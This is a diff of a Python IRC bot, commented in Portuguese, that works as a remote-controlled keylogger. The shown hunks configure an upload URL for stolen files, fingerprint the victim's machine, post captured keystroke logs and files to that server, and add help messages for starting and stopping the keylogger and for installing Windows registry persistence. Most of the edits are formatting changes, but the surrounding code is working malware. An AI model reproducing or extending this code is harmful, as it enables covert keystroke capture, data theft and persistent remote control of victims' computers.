@@ -35,11 +35,11 @@ botPass= "raise"                                           # Password para se co
 urlUpload = "http://meusite.com/upload.php"                # Array PHP que ira receber os arquivos via upload
 urlStrip = urlUpload.strip('http:upload.php')              # Exibe a URL do dos arquivos upados
 ldir = 'store'                                             # Pasta onde sera salvo o arquivo de log local no cliente
-window = None									           # Funcao onKey(event) para capturar o nome da janela
+window = None                                              # Funcao onKey(event) para capturar o nome da janela
 data = ''                                                  # Funcao onKey(event) para tratar os dados capturados
 head = ''                                                  # Para definir o cabecalho da janela capturada no log.txt
 dump = []                                                  # Contador de caracteres, com 100 sobe o log pro Server
-date = time.strftime("%d/%m/%Y")+' - '+time.strftime("%X") #Data e hora no cabecalho de janelo no log.txt
+date = time.strftime("%d/%m/%Y")+' - '+time.strftime("%X") # Data e hora no cabecalho de janelo no log.txt
 pcname = platform.node()                                   # Nome do PC
 pcos = platform.platform()                                 # Nome do OS
 pcprocess = platform.processor()                           # Descricao do Processador
@@ -257,9 +257,9 @@ def upload2(fileup):
             files = {'file': open(fileup, 'rb')}
             requests.post(urlUpload, files=files)
 
-# ----------------------------------------------------------#
-#            F U N C O E S   A U X I L I A R E S            #
-# ----------------------------------------------------------#
+# --------------------------------------------------------------------------------------------------------------------#
+#                                          F U N C O E S   A U X I L I A R E S                                        #
+# --------------------------------------------------------------------------------------------------------------------#
 
 def ping():
 	ircSock.send (str.encode("PONG :pingis\n"))
@@ -339,7 +339,6 @@ def main():
 					EnviaMsg(ircChanne, "[+] Iniciando Keylogger [+]")
 
 		elif ircMsg.find(str.encode("keylog stop")) != -1: # Command to get the host IP
-
 			try:
 				p = ircMsgClean.split()
 				id = p[5]
@@ -391,6 +390,11 @@ def main():
 					time.sleep(1)
 					EnviaMsg(ircChanne, "use: [delete]   para excluir arquivos")
 					time.sleep(1)
+					EnviaMsg(ircChanne, "use: [start keylog]   para ativar o keylogger")
+					time.sleep(1)
+					EnviaMsg(ircChanne, "use: [stop keylog]   para desativar o keylogger")
+					time.sleep(1)
+					EnviaMsg(ircChanne, "use: [persistence]   para instalar persistencia no registro do Windows")
 
 		elif ircMsg.find(str.encode("botnick")) != -1: # Command to get bot nickname
 			EnviaMsg(ircChanne, "Nickname: " + botNick)
